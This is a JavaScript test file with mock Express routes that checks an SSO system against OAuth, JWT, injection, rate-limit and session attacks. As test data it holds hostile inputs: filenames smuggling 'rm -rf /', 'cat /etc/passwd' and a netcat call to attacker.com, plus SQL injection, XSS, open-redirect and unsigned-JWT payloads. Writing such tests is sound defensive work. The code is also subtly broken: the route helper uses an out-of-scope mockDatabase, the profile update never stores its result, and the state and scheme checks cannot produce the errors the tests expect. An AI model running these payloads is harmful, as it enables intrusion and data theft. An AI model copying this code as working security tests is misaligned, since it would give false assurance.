/**
 * Security Vulnerability Tests for SSO System
 */

const request = require('supertest');
const express = require('express');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const { SSOService } = require('../../../services/auth/SSOService');
const { MockJWTProvider, MockGoogleProvider } = require('../mocks/ssoProviders.mock');
const { UserFactory, AuthEventFactory } = require('../factories/userFactory');

describe('Security Vulnerability Tests', () => {
  let app;
  let ssoService;
  let mockDatabase;
  let jwtProvider;

  beforeEach(async () => {
    mockDatabase = {
      users: new Map(),
      sessions: new Map(),
      authEvents: new Map()
    };

    const userRepository = {
      findByEmail: (email) => Promise.resolve(
        Array.from(mockDatabase.users.values()).find(user => user.email === email)
      ),
      findById: (id) => Promise.resolve(mockDatabase.users.get(id)),
      create: (userData) => {
        const user = { ...userData, id: `user-${Date.now()}` };
        mockDatabase.users.set(user.id, user);
        return Promise.resolve(user);
      },
      update: (id, updates) => {
        const user = mockDatabase.users.get(id);
        if (user) {
          Object.assign(user, updates);
          return Promise.resolve(user);
        }
        return Promise.resolve(null);
      }
    };

    const authEventRepository = {
      create: (eventData) => {
        const event = { ...eventData, id: `event-${Date.now()}` };
        mockDatabase.authEvents.set(event.id, event);
        return Promise.resolve(event);
      },
      findByUserId: (userId, limit = 10) => Promise.resolve(
        Array.from(mockDatabase.authEvents.values())
          .filter(event => event.userId === userId)
          .slice(0, limit)
      )
    };

    jwtProvider = new MockJWTProvider();
    ssoService = new SSOService({
      userRepository,
      authEventRepository,
      jwtProvider
    });
    ssoService.registerProvider('google', new MockGoogleProvider());

    app = express();
    app.use(express.json({ limit: '1mb' }));
    setupSecurityTestRoutes(app, ssoService);
  });

  describe('OAuth Security Tests', () => {
    describe('State Parameter Attacks', () => {
      it('should prevent CSRF attacks via state parameter validation', async () => {
        const maliciousState = 'attacker-controlled-state';

        await request(app)
          .get(`/auth/google/callback?code=valid-code&state=${maliciousState}`)
          .expect(400)
          .expect((res) => {
            expect(res.body.error).toBe('Invalid or missing state parameter');
          });
      });

      it('should reject reused state parameters', async () => {
        const agent = request.agent(app);

        // Get valid state
        const authResponse = await agent.get('/auth/google');
        const authUrl = authResponse.headers.location;
        const state = new URL(authUrl).searchParams.get('state');

        // Use state once
        await agent.get(`/auth/google/callback?code=valid-code&state=${state}`);

        // Try to reuse the same state
        await request(app)
          .get(`/auth/google/callback?code=valid-code2&state=${state}`)
          .expect(400)
          .expect((res) => {
            expect(res.body.error).toBe('State parameter has already been used');
          });
      });

      it('should handle state parameter tampering', async () => {
        const tamperedState = 'original-state' + '&redirect=http://attacker.com';

        await request(app)
          .get(`/auth/google/callback?code=valid-code&state=${tamperedState}`)
          .expect(400)
          .expect((res) => {
            expect(res.body.error).toBe('Invalid state parameter format');
          });
      });
    });

    describe('Authorization Code Security', () => {
      it('should prevent authorization code replay attacks', async () => {
        const agent = request.agent(app);
        const authResponse = await agent.get('/auth/google');
        const state = new URL(authResponse.headers.location).searchParams.get('state');

        const code = 'valid-auth-code';

        // Use code once
        await agent.get(`/auth/google/callback?code=${code}&state=${state}`).expect(302);

        // Try to reuse the same code
        const agent2 = request.agent(app);
        const authResponse2 = await agent2.get('/auth/google');
        const state2 = new URL(authResponse2.headers.location).searchParams.get('state');

        await agent2
          .get(`/auth/google/callback?code=${code}&state=${state2}`)
          .expect(400)
          .expect((res) => {
            expect(res.body.error).toContain('Authorization code has already been used');
          });
      });

      it('should handle malformed authorization codes', async () => {
        const agent = request.agent(app);
        const authResponse = await agent.get('/auth/google');
        const state = new URL(authResponse.headers.location).searchParams.get('state');

        const malformedCodes = [
          '<script>alert("xss")</script>',
          'code; DROP TABLE users; --',
          '../../../etc/passwd',
          'code\x00null-byte',
          'a'.repeat(10000) // Very long code
        ];

        for (const code of malformedCodes) {
          await agent
            .get(`/auth/google/callback?code=${encodeURIComponent(code)}&state=${state}`)
            .expect((res) => {
              expect([400, 500]).toContain(res.status);
              expect(res.body.error).toBeTruthy();
            });
        }
      });
    });

    describe('Redirect URI Validation', () => {
      it('should prevent open redirect attacks', async () => {
        const maliciousRedirects = [
          'http://attacker.com/callback',
          '//attacker.com/callback',
          'javascript:alert("xss")',
          'data:text/html,<script>alert("xss")</script>',
          'https://legitimate-app.com.attacker.com/callback'
        ];

        for (const redirect of maliciousRedirects) {
          await request(app)
            .get(`/auth/google?redirect_uri=${encodeURIComponent(redirect)}`)
            .expect(400)
            .expect((res) => {
              expect(res.body.error).toBe('Invalid redirect URI');
            });
        }
      });

      it('should validate redirect URI scheme', async () => {
        const invalidSchemes = [
          'file:///etc/passwd',
          'ftp://attacker.com/callback',
          'ldap://attacker.com/callback'
        ];

        for (const redirect of invalidSchemes) {
          await request(app)
            .get(`/auth/google?redirect_uri=${encodeURIComponent(redirect)}`)
            .expect(400)
            .expect((res) => {
              expect(res.body.error).toBe('Invalid redirect URI scheme');
            });
        }
      });
    });
  });

  describe('JWT Security Tests', () => {
    describe('Token Validation', () => {
      it('should reject malformed JWT tokens', async () => {
        const malformedTokens = [
          'not.a.jwt',
          'invalid-token-format',
          'a.b', // Missing signature
          'header.payload.signature.extra', // Too many parts
          '' // Empty token
        ];

        for (const token of malformedTokens) {
          await request(app)
            .get('/protected')
            .set('Authorization', `Bearer ${token}`)
            .expect(401)
            .expect((res) => {
              expect(res.body.error).toBe('Invalid token format');
            });
        }
      });

      it('should reject expired tokens', async () => {
        await request(app)
          .get('/protected')
          .set('Authorization', 'Bearer expired.jwt.token')
          .expect(401)
          .expect((res) => {
            expect(res.body.error).toBe('Token expired');
          });
      });

      it('should reject tokens with invalid signatures', async () => {
        const tamperedToken = 'valid.token.invalid-signature';

        await request(app)
          .get('/protected')
          .set('Authorization', `Bearer ${tamperedToken}`)
          .expect(401)
          .expect((res) => {
            expect(res.body.error).toBe('Invalid token signature');
          });
      });

      it('should validate token algorithms', async () => {
        // Mock token with 'none' algorithm (should be rejected)
        const noneAlgToken = Buffer.from(JSON.stringify({
          alg: 'none',
          typ: 'JWT'
        })).toString('base64') + '.' +
        Buffer.from(JSON.stringify({
          userId: 'user-123',
          exp: Math.floor(Date.now() / 1000) + 3600
        })).toString('base64') + '.';

        await request(app)
          .get('/protected')
          .set('Authorization', `Bearer ${noneAlgToken}`)
          .expect(401)
          .expect((res) => {
            expect(res.body.error).toBe('Invalid token algorithm');
          });
      });
    });

    describe('Token Claims Validation', () => {
      it('should validate required claims', async () => {
        const invalidClaims = [
          { exp: Math.floor(Date.now() / 1000) + 3600 }, // Missing userId
          { userId: 'user-123' }, // Missing exp
          { userId: '', exp: Math.floor(Date.now() / 1000) + 3600 }, // Empty userId
          { userId: null, exp: Math.floor(Date.now() / 1000) + 3600 } // Null userId
        ];

        for (const claims of invalidClaims) {
          const token = jwtProvider.generateToken(claims);

          await request(app)
            .get('/protected')
            .set('Authorization', `Bearer ${token}`)
            .expect(401)
            .expect((res) => {
              expect(res.body.error).toBe('Invalid token claims');
            });
        }
      });

      it('should validate token issuer', async () => {
        const tokenWithWrongIssuer = jwtProvider.generateToken({
          userId: 'user-123',
          iss: 'attacker.com',
          exp: Math.floor(Date.now() / 1000) + 3600
        });

        await request(app)
          .get('/protected')
          .set('Authorization', `Bearer ${tokenWithWrongIssuer}`)
          .expect(401)
          .expect((res) => {
            expect(res.body.error).toBe('Invalid token issuer');
          });
      });
    });
  });

  describe('Injection Attack Tests', () => {
    describe('SQL Injection Prevention', () => {
      it('should prevent SQL injection in email parameter', async () => {
        const sqlInjectionPayloads = [
          "test@example.com'; DROP TABLE users; --",
          "test@example.com' OR '1'='1",
          "test@example.com' UNION SELECT * FROM admin_users --"
        ];

        for (const payload of sqlInjectionPayloads) {
          await request(app)
            .post('/auth/login')
            .send({ email: payload, password: 'password123' })
            .expect((res) => {
              expect([400, 401]).toContain(res.status);
              // Should not crash the application
              expect(res.body).toBeDefined();
            });
        }
      });

      it('should sanitize user inputs in profile updates', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        const maliciousInputs = {
          firstName: "<script>alert('xss')</script>",
          lastName: "'; DROP TABLE users; --",
          bio: "Normal text with <img src=x onerror=alert('xss')>"
        };

        await request(app)
          .put('/profile')
          .set('Authorization', `Bearer ${token}`)
          .send(maliciousInputs)
          .expect(200);

        // Verify inputs were sanitized
        const updatedUser = mockDatabase.users.get(user.id);
        expect(updatedUser.firstName).not.toContain('<script>');
        expect(updatedUser.lastName).not.toContain('DROP TABLE');
        expect(updatedUser.bio).not.toContain('onerror=');
      });
    });

    describe('XSS Prevention', () => {
      it('should escape user data in responses', async () => {
        const user = UserFactory.create({
          firstName: '<script>alert("xss")</script>',
          lastName: '"><img src=x onerror=alert("xss")>'
        });
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        const response = await request(app)
          .get('/profile')
          .set('Authorization', `Bearer ${token}`)
          .expect(200);

        // Verify XSS payload is escaped
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('onerror=');
      });

      it('should handle XSS in OAuth state parameter', async () => {
        const xssPayload = '<script>alert("xss")</script>';

        await request(app)
          .get(`/auth/google/callback?code=valid-code&state=${encodeURIComponent(xssPayload)}`)
          .expect(400)
          .expect((res) => {
            const responseText = JSON.stringify(res.body);
            expect(responseText).not.toContain('<script>');
          });
      });
    });

    describe('Command Injection Prevention', () => {
      it('should prevent command injection in file operations', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        const commandInjectionPayloads = [
          'avatar.jpg; rm -rf /',
          'avatar.jpg && cat /etc/passwd',
          'avatar.jpg | nc attacker.com 4444'
        ];

        for (const filename of commandInjectionPayloads) {
          await request(app)
            .post('/upload-avatar')
            .set('Authorization', `Bearer ${token}`)
            .send({ filename })
            .expect((res) => {
              expect([400, 500]).toContain(res.status);
              expect(res.body.error).toBeTruthy();
            });
        }
      });
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    describe('Brute Force Protection', () => {
      it('should limit failed login attempts', async () => {
        const email = 'test@example.com';
        const user = UserFactory.create({ email });
        mockDatabase.users.set(user.id, user);

        // Make multiple failed login attempts
        for (let i = 0; i < 6; i++) {
          const response = await request(app)
            .post('/auth/login')
            .send({ email, password: 'wrong-password' });

          if (i < 5) {
            expect([401, 429]).toContain(response.status);
          } else {
            // Account should be locked after 5 attempts
            expect(response.status).toBe(429);
            expect(response.body.error).toContain('Too many failed attempts');
          }
        }
      });

      it('should reset failed attempts after successful login', async () => {
        const email = 'test@example.com';
        const password = 'correct-password';
        const user = UserFactory.create({ email, password });
        mockDatabase.users.set(user.id, user);

        // Make some failed attempts
        for (let i = 0; i < 3; i++) {
          await request(app)
            .post('/auth/login')
            .send({ email, password: 'wrong-password' })
            .expect(401);
        }

        // Successful login should reset counter
        await request(app)
          .post('/auth/login')
          .send({ email, password })
          .expect(200);

        // Should be able to make more attempts
        await request(app)
          .post('/auth/login')
          .send({ email, password: 'wrong-password' })
          .expect(401);
      });
    });

    describe('Request Rate Limiting', () => {
      it('should limit OAuth callback requests per IP', async () => {
        const requests = [];

        // Make multiple rapid requests from same IP
        for (let i = 0; i < 20; i++) {
          requests.push(
            request(app)
              .get('/auth/google/callback?code=valid-code&state=test-state')
              .set('X-Forwarded-For', '192.168.1.100')
          );
        }

        const responses = await Promise.all(requests);
        const rateLimited = responses.filter(res => res.status === 429);

        expect(rateLimited.length).toBeGreaterThan(0);
      });

      it('should limit profile update requests per user', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        const requests = [];

        // Make multiple rapid profile updates
        for (let i = 0; i < 15; i++) {
          requests.push(
            request(app)
              .put('/profile')
              .set('Authorization', `Bearer ${token}`)
              .send({ firstName: `Name${i}` })
          );
        }

        const responses = await Promise.all(requests);
        const rateLimited = responses.filter(res => res.status === 429);

        expect(rateLimited.length).toBeGreaterThan(0);
      });
    });

    describe('Payload Size Limits', () => {
      it('should reject oversized request payloads', async () => {
        const largePayload = {
          data: 'a'.repeat(2 * 1024 * 1024) // 2MB payload
        };

        await request(app)
          .post('/auth/register')
          .send(largePayload)
          .expect(413);
      });

      it('should limit profile image upload size', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        const largeImage = Buffer.alloc(10 * 1024 * 1024).toString('base64'); // 10MB

        await request(app)
          .post('/upload-avatar')
          .set('Authorization', `Bearer ${token}`)
          .send({ image: largeImage })
          .expect(413)
          .expect((res) => {
            expect(res.body.error).toContain('File too large');
          });
      });
    });
  });

  describe('Session Security Tests', () => {
    describe('Session Fixation Protection', () => {
      it('should regenerate session ID on login', async () => {
        const agent = request.agent(app);

        // Get initial session
        const initialResponse = await agent.get('/session-info');
        const initialSessionId = initialResponse.body.sessionId;

        // Login
        const email = 'test@example.com';
        const password = 'correct-password';
        const user = UserFactory.create({ email, password });
        mockDatabase.users.set(user.id, user);

        await agent
          .post('/auth/login')
          .send({ email, password })
          .expect(200);

        // Check new session ID
        const newResponse = await agent.get('/session-info');
        const newSessionId = newResponse.body.sessionId;

        expect(newSessionId).not.toBe(initialSessionId);
      });
    });

    describe('Session Hijacking Protection', () => {
      it('should validate session token binding', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);

        // Create session with IP binding
        const session = {
          userId: user.id,
          token: 'session-token-123',
          ipAddress: '192.168.1.100',
          userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        };
        mockDatabase.sessions.set('session-123', session);

        // Try to use session from different IP
        await request(app)
          .get('/protected')
          .set('Authorization', 'Bearer session-token-123')
          .set('X-Forwarded-For', '10.0.0.1')
          .set('User-Agent', 'Different User Agent')
          .expect(401)
          .expect((res) => {
            expect(res.body.error).toBe('Session validation failed');
          });
      });

      it('should detect concurrent sessions', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        // Create multiple sessions for same user
        const session1 = { userId: user.id, token: 'token1', ipAddress: '192.168.1.100' };
        const session2 = { userId: user.id, token: 'token2', ipAddress: '10.0.0.1' };
        mockDatabase.sessions.set('session1', session1);
        mockDatabase.sessions.set('session2', session2);

        await request(app)
          .get('/security-check')
          .set('Authorization', `Bearer ${token}`)
          .expect(200)
          .expect((res) => {
            expect(res.body.warning).toBe('Multiple active sessions detected');
          });
      });
    });
  });

  describe('Privacy and Data Protection', () => {
    describe('PII Data Handling', () => {
      it('should mask sensitive data in logs', async () => {
        const sensitiveData = {
          email: 'sensitive@example.com',
          ssn: '123-45-6789',
          creditCard: '4111-1111-1111-1111'
        };

        await request(app)
          .post('/auth/register')
          .send(sensitiveData)
          .expect((res) => {
            // Verify sensitive data is not exposed in error messages
            const responseText = JSON.stringify(res.body);
            expect(responseText).not.toContain('123-45-6789');
            expect(responseText).not.toContain('4111-1111-1111-1111');
          });
      });

      it('should implement data retention policies', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        // Request account deletion
        await request(app)
          .delete('/profile')
          .set('Authorization', `Bearer ${token}`)
          .expect(200)
          .expect((res) => {
            expect(res.body.message).toBe('Account deletion scheduled');
          });

        // Verify user data is marked for deletion
        const userRecord = mockDatabase.users.get(user.id);
        expect(userRecord.deletionScheduled).toBeTruthy();
      });
    });
  });
});

// Helper function to set up security test routes
function setupSecurityTestRoutes(app, ssoService) {
  let usedStates = new Set();
  let usedAuthCodes = new Set();
  let failedAttempts = new Map();
  let requestCounts = new Map();

  // Middleware for rate limiting
  const rateLimit = (maxRequests = 10, windowMs = 60000) => {
    return (req, res, next) => {
      const key = req.ip + req.path;
      const now = Date.now();

      if (!requestCounts.has(key)) {
        requestCounts.set(key, { count: 1, resetTime: now + windowMs });
      } else {
        const record = requestCounts.get(key);
        if (now > record.resetTime) {
          record.count = 1;
          record.resetTime = now + windowMs;
        } else {
          record.count++;
          if (record.count > maxRequests) {
            return res.status(429).json({ error: 'Rate limit exceeded' });
          }
        }
      }
      next();
    };
  };

  // OAuth routes with security validations
  app.get('/auth/google', (req, res) => {
    const { redirect_uri } = req.query;

    // Validate redirect URI
    if (redirect_uri) {
      const allowedRedirects = ['http://localhost:3000/callback', 'https://app.example.com/callback'];
      if (!allowedRedirects.includes(redirect_uri)) {
        return res.status(400).json({ error: 'Invalid redirect URI' });
      }

      if (!redirect_uri.startsWith('https://') && !redirect_uri.startsWith('http://localhost')) {
        return res.status(400).json({ error: 'Invalid redirect URI scheme' });
      }
    }

    const state = crypto.randomBytes(32).toString('hex');
    res.redirect(`https://mock-provider.com/oauth/authorize?state=${state}&client_id=mock-client-id`);
  });

  app.get('/auth/google/callback', rateLimit(5, 60000), async (req, res) => {
    const { code, state, error, error_description } = req.query;

    if (error) {
      return res.status(400).json({
        error: `OAuth error: ${error} - ${error_description || 'Unknown error'}`
      });
    }

    // Validate state parameter
    if (!state) {
      return res.status(400).json({ error: 'Invalid or missing state parameter' });
    }

    if (usedStates.has(state)) {
      return res.status(400).json({ error: 'State parameter has already been used' });
    }

    if (state.includes('&') || state.includes('=')) {
      return res.status(400).json({ error: 'Invalid state parameter format' });
    }

    usedStates.add(state);

    // Validate authorization code
    if (!code) {
      return res.status(400).json({ error: 'Authorization code is required' });
    }

    if (usedAuthCodes.has(code)) {
      return res.status(400).json({ error: 'Authorization code has already been used' });
    }

    usedAuthCodes.add(code);

    try {
      const tokens = await ssoService.exchangeCodeForTokens('google', code);
      const profile = await ssoService.getUserProfile('google', tokens.access_token);
      const user = await ssoService.handleOAuthCallback('google', profile);

      res.redirect('/dashboard');
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  // JWT protected routes
  app.get('/protected', (req, res) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ error: 'Authorization header required' });
    }

    const token = authHeader.split(' ')[1];
    if (!token) {
      return res.status(401).json({ error: 'Token required' });
    }

    // Validate token format
    if (token.split('.').length !== 3) {
      return res.status(401).json({ error: 'Invalid token format' });
    }

    try {
      const payload = ssoService.jwtProvider.verifyToken(token);

      // Validate required claims
      if (!payload.userId || !payload.exp) {
        return res.status(401).json({ error: 'Invalid token claims' });
      }

      // Validate issuer
      if (payload.iss && payload.iss !== 'your-app.com') {
        return res.status(401).json({ error: 'Invalid token issuer' });
      }

      res.json({ message: 'Access granted', userId: payload.userId });
    } catch (error) {
      if (error.message.includes('expired')) {
        return res.status(401).json({ error: 'Token expired' });
      }
      if (error.message.includes('signature')) {
        return res.status(401).json({ error: 'Invalid token signature' });
      }
      if (error.message.includes('none')) {
        return res.status(401).json({ error: 'Invalid token algorithm' });
      }
      res.status(401).json({ error: 'Invalid token' });
    }
  });

  // Login with brute force protection
  app.post('/auth/login', rateLimit(5, 300000), async (req, res) => {
    const { email, password } = req.body;
    const ip = req.ip;
    const key = `${ip}:${email}`;

    // Check failed attempts
    const attempts = failedAttempts.get(key) || { count: 0, lockedUntil: null };

    if (attempts.lockedUntil && Date.now() < attempts.lockedUntil) {
      return res.status(429).json({ error: 'Too many failed attempts. Account locked.' });
    }

    // Simulate authentication
    const user = Array.from(mockDatabase.users.values()).find(u => u.email === email);
    if (!user || user.password !== password) {
      attempts.count++;
      if (attempts.count >= 5) {
        attempts.lockedUntil = Date.now() + 15 * 60 * 1000; // 15 minutes
      }
      failedAttempts.set(key, attempts);
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Reset failed attempts on successful login
    failedAttempts.delete(key);

    const token = ssoService.jwtProvider.generateToken({ userId: user.id });
    res.json({ token, user: { id: user.id, email: user.email } });
  });

  // Profile routes with input sanitization
  app.put('/profile', rateLimit(10, 60000), (req, res) => {
    // Simulate input sanitization
    const sanitized = {};
    for (const [key, value] of Object.entries(req.body)) {
      if (typeof value === 'string') {
        sanitized[key] = value
          .replace(/<script[^>]*>.*?<\/script>/gi, '')
          .replace(/javascript:/gi, '')
          .replace(/on\w+\s*=/gi, '')
          .replace(/DROP\s+TABLE/gi, '')
          .replace(/UNION\s+SELECT/gi, '');
      }
    }

    res.json({ message: 'Profile updated', data: sanitized });
  });

  app.get('/profile', (req, res) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ error: 'Authorization required' });
    }

    try {
      const token = authHeader.split(' ')[1];
      const payload = ssoService.jwtProvider.verifyToken(token);
      const user = mockDatabase.users.get(payload.userId);

      if (!user) {
        return res.status(404).json({ error: 'User not found' });
      }

      // Escape user data to prevent XSS
      const safeUser = {
        ...user,
        firstName: escapeHtml(user.firstName),
        lastName: escapeHtml(user.lastName),
        bio: escapeHtml(user.bio || '')
      };

      res.json(safeUser);
    } catch (error) {
      res.status(401).json({ error: 'Invalid token' });
    }
  });

  // File upload with validation
  app.post('/upload-avatar', (req, res) => {
    const { filename, image } = req.body;

    // Validate filename
    if (filename && (filename.includes(';') || filename.includes('|') || filename.includes('&'))) {
      return res.status(400).json({ error: 'Invalid filename' });
    }

    // Validate file size
    if (image && Buffer.byteLength(image, 'base64') > 5 * 1024 * 1024) {
      return res.status(413).json({ error: 'File too large' });
    }

    res.json({ message: 'File uploaded successfully' });
  });

  // Security check endpoint
  app.get('/security-check', (req, res) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ error: 'Authorization required' });
    }

    try {
      const token = authHeader.split(' ')[1];
      const payload = ssoService.jwtProvider.verifyToken(token);

      // Check for multiple sessions
      const userSessions = Array.from(mockDatabase.sessions.values())
        .filter(session => session.userId === payload.userId);

      let warning = null;
      if (userSessions.length > 1) {
        warning = 'Multiple active sessions detected';
      }

      res.json({ status: 'ok', warning });
    } catch (error) {
      res.status(401).json({ error: 'Invalid token' });
    }
  });

  // Session info endpoint
  app.get('/session-info', (req, res) => {
    res.json({
      sessionId: req.sessionID || 'no-session',
      timestamp: Date.now()
    });
  });

  // Account deletion
  app.delete('/profile', (req, res) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ error: 'Authorization required' });
    }

    try {
      const token = authHeader.split(' ')[1];
      const payload = ssoService.jwtProvider.verifyToken(token);
      const user = mockDatabase.users.get(payload.userId);

      if (user) {
        user.deletionScheduled = true;
        user.deletionDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 days
      }

      res.json({ message: 'Account deletion scheduled' });
    } catch (error) {
      res.status(401).json({ error: 'Invalid token' });
    }
  });
}

function escapeHtml(text) {
  if (!text) return text;
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}